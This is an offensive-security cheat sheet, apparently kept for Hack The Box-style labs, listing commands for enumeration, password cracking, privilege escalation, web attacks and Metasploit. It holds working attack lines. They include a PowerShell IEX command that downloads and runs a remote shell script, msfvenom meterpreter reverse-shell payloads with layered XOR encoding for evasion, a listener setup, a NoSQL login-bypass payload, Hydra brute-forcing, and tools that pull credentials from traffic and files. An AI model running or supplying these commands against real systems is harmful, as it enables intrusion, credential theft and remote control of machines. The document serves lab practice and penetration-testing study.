Paths are for KALI

# Enumeration

## Port Discovery

Fast port discovery

    $ sudo docker run -it --rm --name rustscan rustscan/rustscan:1.10.0 10.10.10.242
    $ masscan -p1-65535 10.10.10.10

List all ports with possible vulnerabilities

    $ nmap -A -p4386 -v -sS -sV --script vuln 10.10.10.178

List top 1000 UDP ports with possible vulnerabilities

    $ nmap -A -v -sU -sV --script vuln 10.10.10.178

You can also use netcat to do port scanning

    $ nc -zv localhost 1-65535

## Web Fuzzing

Fuzzing page

    $ wfuzz -Z -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://10.10.10.158/FUZZ

Fuzzing vhosts

    $ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt -H "Host: FUZZ" http://testphp.vulnweb.com/

Fuzzing for backup:

    $ wfuzz -Z -c -z file,/usr/share/dirb/wordlists/mutations_common.txt --hc 404 http://10.10.10.156/index.html.FUZZ 

Also .something.swp for VIM

Combining multiples sources:

   $ wfuzz -z file,big.txt -z file,common.txt --hc 404 http://forwardslash.htb/FUZZ/FUZ2Z.php

Range of values:

   $ wfuzz -z range --zD 0-3 -z list --zD "'" -u http://testphp.vulnweb.com/artists.php?artist=FUZZFUZ2Z -A

From stdin

   $ egrep '.jsp$' raft-large-files-lowercase.txt | wfuzz -z stdin --hc 404 http://site/service/FUZZ

Reference: [wfuzz manual](https://wfuzz.readthedocs.io/en/latest/user/advanced.html)

With ffuf:

    $ ffuf -request request.bin -request-proto http -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-extensions.txt -fc 400
    $ ffuf -w file1:FUZZ -w file2:FUZZ2 -u http://site/service/FUZZFUZZ2 -fc 301

### Great collections of wordlists

 - https://github.com/danielmiessler/SecLists/
 - /usr/share/wordlists/amass/all.txt
 - /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 - https://github.com/Bo0oM/fuzz.txt/blob/master/fuzz.txt

With gobuster

    $ gobuster vhost -u http://xxx -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

With reconspider https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip

## Code analysis

 - If directory .git is exposed: [git-dumper](https://github.com/arthaud/git-dumper)
 - [Secrets scanner](https://github.com/Yelp/detect-secrets)
 - [Vuln scanner](https://semgrep.dev/docs/getting-started/quickstart)
 - SCA
 - [semgrep](https://semgrep.dev/)

## LDAP

List users:

    ldapsearch -h 10.10.10.161 -p 389 -x -b 'DC=htb,DC=local' "*" "*" + | egrep "^sAMAccountName" | sed "s/sAMAccountName: //g" > users.txt

Find if an entry password exits:

    ldapsearch -h 10.10.10.161 -p 389 -x -b 'CN=htb,DC=local' "(sAMAccountName=*)" "*" + | egrep -i "(password|pwd|pass|passwd)"

## DNS

Zone transfert

    # host -l domain nameserver
    # dnsrecon -n 10.20.30.40 -d my-domain.com -t axfr

## WebShell

 - [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)

# Cracking

Identify Hash : `# hash-identifier`

Running John:

    # john --format=dynamic_82 --wordlist=wordlist.txt --rules=d3ad0ne hash.txt

List formats:

    # john --list=format-details

Password with known part:

    # john --format=dynamic_1034 --wordlist=/usr/share/wordlists/rockyou.txt --mask='?wknown-part' hashes.txt

A lot of scripts to convert to JOHN are under /usr/share/john/

Cracking with hashcat:

    # hashcat --example-hashes | grep -i -B 1 -A 1 filezilla
    # hashcat --force -m 15000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

Building wordlists by scrapping a website:

    # cewl http://website > dic.txt


# Services

## Detecting incoming connections

For ICMP

    tcpdump -i tun0 icmp

## Extract creds from traffic

[net-creds](https://github.com/DanMcInerney/net-creds)

    sudo python net-creds.py -i eth0
    sudo python net-creds.py -p pcapfile


## HTTP Service

Share your local directory

    python3 -m http.server 80

## Samba Service

    # cat /etc/samba/smb.conf
    [htb]
    path=/smb/
    browseable = yes
    read only = yes
    create mask = 777
    guest ok = yes
    
    [upload]
    path=/root/htb/sniper/upload/
    browseable = yes
    read only = no
    create mask = 777
    directory mask = 755
    guest ok = yes
    writeable = yes
    
    # service nmbd start
    # service smbd start

## Simple FTP

Twisted

    twistd -n ftp

# Reverse Shells

 - A reference: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - Gaining a tty on Linux (From [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/))

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ stty rows 38 columns 250
```

# Windows

 - Download file: $WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://www.contoso.com/file","C:\path\file")

## Tools

 - Bloodhound: discover vulnerabilities in your AD. You need to run `powershell -Command "Import-Module .\SharpHound.ps1;nvoke-BloodHound -Domain <DOMAIN> -LDAPUser <USER> -LDAPPass <PASS> -CollectionMethod All -DomainController <DomainController>  -ZipFileName data.zip -Verbose"` to get the data to feed Bloodhound.
 - Invoke-ACLPwn: Useful if the user has the WriteDACL right
 - [Evil-RM](https://github.com/Hackplayers/evil-winrm) : shell to connect to WinRM
 - enum4linux

## Enumeration

    systeminfo
    net users
    net groups
    impacket-lookupsid machine/user@10.10.10.10
    nulllinux 10.10.10.10 -u guest


Get all infos about user:

    whoami /all

With SEImpersonification, have a look to [LovelyPotato](https://github.com/TsukiCTF/Lovely-Potato)

Running processes:

    tasklist
    tasklist /FI "ImageName eq ExeFile.exe" /v /fo List
    wmic process get ProcessID,ExecutablePath

Querying the registery

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

Querying the registry with PowerShell

    Get-ChildItem -Path Registry::HKLM\SOFTWARE\Wow6432Node\ # Display property
    (Get-ItemProperty -Path Registry::HKLM\SOFTWARE\an\item).subkey
    
Find all files with the word password, case insensitive

    PS C:> findstr /smi password *

List contents of shares:

    smbmap -R -u <USER> -p <PASS> -H 10.10.10.151

Retrieve a folder recursively:

    smbget -R -U User smb://10.10.10.178/SHARE\$/XXX/

Search creds in file

    snaffler
    lazagne


Display tree
    
    tree /F /A

View rights of a directory

     icacls <dir>

Connect with smbexec

     impacket-smbexec DOMAIN/user@IP

## Powershell

Running remote script directly

    PS C:> Invoke-WebRequest 'http://10.10.14.15:8000/reverse.exe' -OutFile reverse.exe
    PS C:> IEX (New-Object Net.WebClient).DownloadString(‘https://10.10.14.8/shell.ps1’)

Run WinRM commands from powershell:

    $username = 'HOST\Login'
    $password = '<PASS>'
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
    Invoke-Command -Credential $credential -ScriptBlock { whoami } -Computer $computer

Execute command from PowerShell

    cmd /r dir /s /b





## WTFs?

You can hide informations in a Alternate Data Stream. You can detect with smbclient:

    smbclient -U LOGIN \\\\10.10.10.178\\C\$\\ <PASS>
    > cd xxx
    > allinfo a_file
    ...
    stream: [:<STREAM_NAME>:$DATA], 15 bytes

You can [view ADS with smbclient from Linux](https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux)

    smbclient -U <LOGIN> //<IP>/<SHARE> <PASS>
    more PATH/TO/FILE:<STREAM NAME>:$DATA

Or with powershell:

    Get-Item -Path .\a_file  -Stream *
    Get-Content -Path .\a_file -Stream the_stream

# Linux

## Enumeration

 - [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
 - [linuxprivesc](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

Basic user info:

    # id

View environment variables

    # export

View open ports:

    # netstat

View open ports without netstat from [Staaldraad blog](https://staaldraad.github.io/2017/12/20/netstat-without-netstat/):

    # awk 'function hextodec(str,ret,n,i,k,c){
    ret = 0
    n = length(str)
    for (i = 1; i <= n; i++) {
        c = tolower(substr(str, i, 1))
        k = index("123456789abcdef", c)
        ret = ret * 16 + k
    }
    return ret
}
function getIP(str,ret){
    ret=hextodec(substr(str,index(str,":")-2,2)); 
    for (i=5; i>0; i-=2) {
        ret = ret"."hextodec(substr(str,i,2))
    }
    ret = ret":"hextodec(substr(str,index(str,":")+1,4))
    return ret
} 
NR > 1 {{if(NR==2)print "Local - Remote";local=getIP($2);remote=getIP($3)}{print local" - "remote}}' /proc/net/tcp 


View actions of process:
  
   # strace
   # [pspy64](https://github.com/DominicBreuker/pspy)

### Find interesting files

Find readable files, sorted by date:

    # find . -type f  -perm -004 -exec ls -l --time-style="+%Y-%m-%d" {} \; 2>&1 | grep -v Permission | cut -d' ' -f6,7 | sort

Find backups files:

    # find / -name *.bak 2> /dev/null

Find keys:

    # find / -name id_* 2> /dev/null

Find hidden files:
 
    # find / -name ".*" 2> /dev/null

Find a file owned by a group or a user:

    # find / -user root -group root -type f

Find files with specific permissions:

    # find / -perm -4000 -type f # With suid
    # find / -perm /u=w -type d -user qtc # User qtc has write access to a directory

Find files modified from a date:

    # find . -type f -newermt 2020-02-11 -exec ls -l {} \; 

## Misc

Port forwarding to access a local postgres server:

    # ssh -i ~/.ssh/id_ed25519 -L 10.11.12.14:5432:127.0.0.1:5432 user@10.10.10.10


## Getting root

 - Find file with sticky bit: find / -type d -perm -1000 -exec ls -ld {} \;
 - Exec with capabilities
 - Running services with elevated privileges
 - sudo -L. Running vim/less/journalctl/... can give you a shell.  - SSH keys
 - crontab
   * Any wildcard in the command is a joker. After that, you can add what you want. For example, [hacker10 ALL= (root) /bin/less /var/log/* => /bin/less /var/log/* /etc/passwd](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-4-wildcards/)
 - Tools
   * [GTFOBins](https://gtfobins.github.io/) lists mutliple ways to execute a command from an editor. Also, you might need to resize your windows to create a shell. For windows: [LOLBAS](https://lolbas-project.github.io/)
   * [pspy](https://github.com/DominicBreuker/pspy) monitor running processes
   * [WinPeas / LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master) gives a lot of informations

 
## Tools

# Web Attacks

 - Hidden comments in source code (paths, password, ...)
 - SQLi

```
# sqlmap -u http://10.10.10.151/user/login.php --data 'username=test&password=test&submit
```

```
# sqlmap -u 'http://url/api' \
   --headers 'Content-Type: application/json' \
   --data '{"query":"{ xxx(id: \"*\"){ yyy, zzz} }"}' \ # Specify the entrypoint with *
   --level=5 --risk=3 \ # Max aggressivity
   --dbms "MySQL" \ 
   --technique="UB" \ # Specify the type of attack (here union/boolean)
   -D a_db -T a_table -a \ # Database & db to target
   --all # retrieve all the tables
```

 - NoSQLi

    curl http://site/ --data "username[$ne]=toto&password[$ne]=toto&Submit=Sign+in"

 - BruteForce Online

    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt  website  http-post-form "/:username=^USER^&password=^PASS^&login=login:Forgot Password"


# Metasploit

## Msfconsole

Finding a specific exploit

    msf5 > grep eternal search blue



## Meterpreter

Generate meterpreter

    # msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.14.8 lport=4444 verbose=true -f exe -o reverse.exe
    # msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.28 lport=80 verbose=true -f raw | msfvenom --platform windows -a x64 -e x64/xor -i 42 -f raw | msfvenom -a x64 --platform windows -e x64/xor_context -i 17 -f raw | msfvenom -a x64 --platform windows -e x64/xor_dynamic -i 30 -f exe -o /smb/reverse.exe 

List paylods

    # msfvenom --list payloads
    # msfvenom  -p windows/x64/vncinject/reverse_winhttps --list-options

Start wait:

    # msfconsole
    msf5 > use exploit/multi/handler 
    msf5 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp 

Or inline:

    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST {yourip}; set LPORT 9999; exploit -j"


Put on the machine and run 

Port forwarding (to access a local service from a remote machine)

    meterpreter > portfwd add -L <local host> -l <local port> -r <remote host> -p <remote port>

# Reversing

 - Ghidra
 - IDA
 - [.Net Reflector](https://www.red-gate.com/products/dotnet-development/reflector/)

# MISC 

## Python

 * [Simple IPv4 TCP client](client.py)
 * [Simple IPv6 HTTP server](server.py)
 * [Snippet (md5, regex ...)](snippet.py)

## Good practices

Put all users in users.txt and all passwords in passwords.txt. Use scanners from msfconsole to easily test all posibilities.


Find CVE

    # searchsploit filezilla
    # searchsploit -x 5555 # inspect payload
    # searchsploit -m 5555 # copy payload

# Android

unzip file.apk

## Resources

 - [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
 - [How to attack kerberos](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
 - [Default creds cheat sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) `pip3 install defaultcreds-cheat-sheet`
